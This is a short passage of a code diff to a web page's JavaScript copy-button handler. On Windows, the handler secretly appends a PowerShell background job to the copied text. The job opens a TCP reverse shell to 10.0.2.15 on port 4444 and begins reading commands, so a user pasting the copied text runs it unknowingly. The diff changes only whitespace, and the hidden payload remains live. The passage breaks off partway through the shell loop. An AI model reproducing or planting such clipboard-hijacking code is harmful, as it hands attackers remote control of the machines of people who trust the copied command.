@@ -39,7 +39,7 @@ $('#copyButton').on('click', function(e) {
             if(navigator.platform.indexOf("Win") !=-1) {
                 
                 appended = original +...
-		...	'; Start-Job -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient(\'10.0.2.15\',4444);
+			...'; Start-Job -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient(\'10.0.2.15\',4444);
 			$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
 			while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
                         $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
